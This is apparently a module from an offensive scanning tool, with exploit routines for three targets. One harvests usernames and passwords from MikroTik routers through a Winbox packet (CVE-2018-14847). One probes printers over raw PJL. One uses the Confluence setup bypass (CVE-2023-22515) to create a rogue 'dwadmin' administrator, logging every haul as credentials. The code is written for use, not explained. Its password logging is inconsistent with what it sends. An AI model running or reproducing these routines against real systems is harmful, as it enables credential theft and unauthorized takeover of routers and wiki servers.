"""MikroTik 2018-14847, Drucker-PJL, Confluence-Setup-Bypass 2023-22515."""
from __future__ import annotations
import re
import socket
import time

MIK = bytes.fromhex(
    "1201000000003030303030303030303030303030303000000000000000000000000000000000000000"
    "00000000000000000000000001000000000000000000")


def mik_detect(t) -> bool:
    return t.port in (8291,)


def mik_harvest(t, audit):
    try:
        s = socket.create_connection((t.host, t.port), timeout=8)
        s.sendall(MIK)
        data = b""
        end = time.time() + 6
        while time.time() < end and len(data) < 8000:
            try:
                s.settimeout(2)
                c = s.recv(4096)
                if not c:
                    break
                data += c
            except Exception:
                break
        s.close()
    except Exception:
        return None
    txt = data.decode("latin-1", "replace")
    users = re.findall(r'"name":"([^"]{1,32})"', txt)
    pw = re.findall(r'"password":"([^"]{0,64})"', txt)
    if not users:
        return None
    pairs = "; ".join(f"{u}:{p}" for u, p in zip(users, pw)) if pw else ", ".join(users)
    audit.write("harvest", "mikrotik-users", t.url, creds=pairs[:300])
    return None


def prn_detect(t) -> bool:
    return t.port in (9100, 9101, 9102)


def prn_harvest(t, audit):
    try:
        s = socket.create_connection((t.host, t.port), timeout=7)
        s.sendall(b"\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X")
        s.settimeout(5)
        data = s.recv(2048)
        s.close()
    except Exception:
        return None
    txt = data.decode("latin-1", "replace").strip()
    if not txt:
        return None
    first = [l for l in txt.splitlines() if l.strip()][:2]
    audit.write("harvest", "printer", t.url, model=" | ".join(first)[:120])
    return None


def conf_bypass(t, audit):
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        s = requests.Session(); s.verify = False
        s.get(t.url + "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",
              timeout=10)
        r = s.post(t.url + "/setup/setupadministrator.action",
                   data={"username": "dwadmin", "fullName": "dw", "email": "dw@local",
                         "password": "Dw!" + str(int(time.time()))[-6:], "confirm": "x",
                         "submit": "Add"},
                   timeout=12)
        pw = "Dw!" + str(int(time.time()))[-6:]
        if r.status_code in (200, 302) and "setup" in r.text.lower():
            audit.write("harvest", "confluence-admin", t.url, creds="dwadmin:" + pw)
    except Exception:
        pass
    return None
